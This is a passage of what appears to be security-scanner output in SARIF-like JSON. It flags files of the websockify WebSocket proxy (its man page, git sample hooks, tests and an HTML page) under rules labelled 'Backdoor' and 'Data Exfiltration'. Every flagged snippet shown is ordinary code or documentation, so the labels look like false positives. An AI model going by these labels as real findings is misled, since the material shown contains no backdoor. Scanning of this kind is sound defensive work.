                      "text": ".SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n.SS Additional websockify features\n\n",
                      "markdown": "`.SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n.SS Additional websockify features\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 273,
                  "endLine": 37,
                  "endColumn": 281,
                  "snippet": {
                    "text": "\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n",
                    "rendered": {
                      "text": "\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n",
                      "markdown": "`\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 25,
                  "endLine": 19,
                  "endColumn": 34,
                  "snippet": {
                    "text": " --record=FILE      record sessions to FILE.[session_number]\n -D, --daemon       become a daemon (background process)\n --run-once         handle a single WebSocket connection and exit\n --timeout=TIMEOUT  after TIMEOUT seconds exit when not connected\n --cert=CERT        SSL certificate file\n --key=KEY          SSL key file (if separate from cert)\n --ssl-only         disallow non-encrypted connections\n",
                    "rendered": {
                      "text": " --record=FILE      record sessions to FILE.[session_number]\n -D, --daemon       become a daemon (background process)\n --run-once         handle a single WebSocket connection and exit\n --timeout=TIMEOUT  after TIMEOUT seconds exit when not connected\n --cert=CERT        SSL certificate file\n --key=KEY          SSL key file (if separate from cert)\n --ssl-only         disallow non-encrypted connections\n",
                      "markdown": "` --record=FILE      record sessions to FILE.[session_number]\n -D, --daemon       become a daemon (background process)\n --run-once         handle a single WebSocket connection and exit\n --timeout=TIMEOUT  after TIMEOUT seconds exit when not connected\n --cert=CERT        SSL certificate file\n --key=KEY          SSL key file (if separate from cert)\n --ssl-only         disallow non-encrypted connections\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 28,
                  "endLine": 29,
                  "endColumn": 3,
                  "snippet": {
                    "text": "                     daemonizes: exit (default), ignore, respawn\n\n.SH DESCRIPTION\n\nAt the most basic level, websockify just translates WebSockets traffic to normal TCP socket traffic. Websockify accepts the WebSockets handshake, parses it, and then begins forwarding traffic between the client and the target in both directions.\n\nwebsockify was formerly named wsproxy and was part of the noVNC project.\n\n",
                    "rendered": {
                      "text": "                     daemonizes: exit (default), ignore, respawn\n\n.SH DESCRIPTION\n\nAt the most basic level, websockify just translates WebSockets traffic to normal TCP socket traffic. Websockify accepts the WebSockets handshake, parses it, and then begins forwarding traffic between the client and the target in both directions.\n\nwebsockify was formerly named wsproxy and was part of the noVNC project.\n\n",
                      "markdown": "`                     daemonizes: exit (default), ignore, respawn\n\n.SH DESCRIPTION\n\nAt the most basic level, websockify just translates WebSockets traffic to normal TCP socket traffic. Websockify accepts the WebSockets handshake, parses it, and then begins forwarding traffic between the client and the target in both directions.\n\nwebsockify was formerly named wsproxy and was part of the noVNC project.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 39,
                  "endLine": 92,
                  "endColumn": 47,
                  "snippet": {
                    "text": "ficate authority) certificate is required for the client connection. With -auth-plugin=ClientCertCNAuth, the client certificate can be checked against a list of authorised certificate users. Non-encrypted connection attempts always fail during authentication.\n\nHere is an example of a vncsevrer with password-less, certificate-driven authentication:\n\n`./websockify 5901 --cert=fullchain.pem --key=privkey.pem --ssl-only --verify-client --cafile=ca-certificates.crt --auth-plugin=ClientCertCNAuth --auth-source='jane@example.com Joe User9824510' --web=noVNC/ --wrap-mode=ignore -- vncserver :1 -geometry 1024x",
                    "rendered": {
                      "text": "ficate authority) certificate is required for the client connection. With -auth-plugin=ClientCertCNAuth, the client certificate can be checked against a list of authorised certificate users. Non-encrypted connection attempts always fail during authentication.\n\nHere is an example of a vncsevrer with password-less, certificate-driven authentication:\n\n`./websockify 5901 --cert=fullchain.pem --key=privkey.pem --ssl-only --verify-client --cafile=ca-certificates.crt --auth-plugin=ClientCertCNAuth --auth-source='jane@example.com Joe User9824510' --web=noVNC/ --wrap-mode=ignore -- vncserver :1 -geometry 1024x",
                      "markdown": "`ficate authority) certificate is required for the client connection. With -auth-plugin=ClientCertCNAuth, the client certificate can be checked against a list of authorised certificate users. Non-encrypted connection attempts always fail during authentication.\n\nHere is an example of a vncsevrer with password-less, certificate-driven authentication:\n\n`./websockify 5901 --cert=fullchain.pem --key=privkey.pem --ssl-only --verify-client --cafile=ca-certificates.crt --auth-plugin=ClientCertCNAuth --auth-source='jane@example.com Joe User9824510' --web=noVNC/ --wrap-mode=ignore -- vncserver :1 -geometry 1024x`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 336,
                  "endLine": 41,
                  "endColumn": 344,
                  "snippet": {
                    "text": "\n.SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n",
                    "rendered": {
                      "text": "\n.SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n",
                      "markdown": "`\n.SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/notes"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 3,
                  "endLine": 5,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    - not really necessary since tagged revision can be downloaded\n      from github as tarballs\n\n    git archive --format=tar --prefix=websockify-${WVER}/ v${WVER} > websockify-${WVER}.tar\n    gzip websockify-${WVER}.tar\n",
                    "rendered": {
                      "text": "    - not really necessary since tagged revision can be downloaded\n      from github as tarballs\n\n    git archive --format=tar --prefix=websockify-${WVER}/ v${WVER} > websockify-${WVER}.tar\n    gzip websockify-${WVER}.tar\n",
                      "markdown": "`    - not really necessary since tagged revision can be downloaded\n      from github as tarballs\n\n    git archive --format=tar --prefix=websockify-${WVER}/ v${WVER} > websockify-${WVER}.tar\n    gzip websockify-${WVER}.tar\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-merge-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 74,
                  "endLine": 74,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                    "rendered": {
                      "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                      "markdown": "`\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 2,
                  "endLine": 65,
                  "endColumn": 8,
                  "snippet": {
                    "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                    "rendered": {
                      "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                      "markdown": "`unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 54,
                  "endLine": 54,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                    "rendered": {
                      "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                      "markdown": "`\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 53,
                  "endLine": 53,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                    "rendered": {
                      "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                      "markdown": "`\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 27,
                  "endLine": 51,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                    "rendered": {
                      "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                      "markdown": "`if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                    "rendered": {
                      "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                      "markdown": "`validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 69,
                  "endLine": 11,
                  "endColumn": 74,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websockifyserver.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 26,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websockifyserver.py"
                },
                "region": {
                  "startLine": 310,
                  "startColumn": 57,
                  "endLine": 310,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self._options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                    "rendered": {
                      "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self._options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                      "markdown": "`            def __init__(self, purpose):\n                self.verify_mode = None\n                self._options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websockifyserver.py"
                },
                "region": {
                  "startLine": 275,
                  "startColumn": 57,
                  "endLine": 275,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                    "rendered": {
                      "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                      "markdown": "`            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websockifyserver.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 57,
                  "endLine": 241,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                    "rendered": {
                      "text": "            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n",
                      "markdown": "`            def __init__(self, purpose):\n                self.verify_mode = None\n                self.options = 0\n            def load_cert_chain(self, certfile, keyfile, password):\n                pass\n            def set_default_verify_paths(self):\n                pass\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/latency.html"
                },
                "region": {
                  "startLine": 255,
                  "startColumn": 103,
                  "endLine": 255,
                  "endColumn": 111,
                  "snippet": {
                    "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n            document.getElementById('payload_size').value = payload_size;\n        }\n",
                    "rendered": {
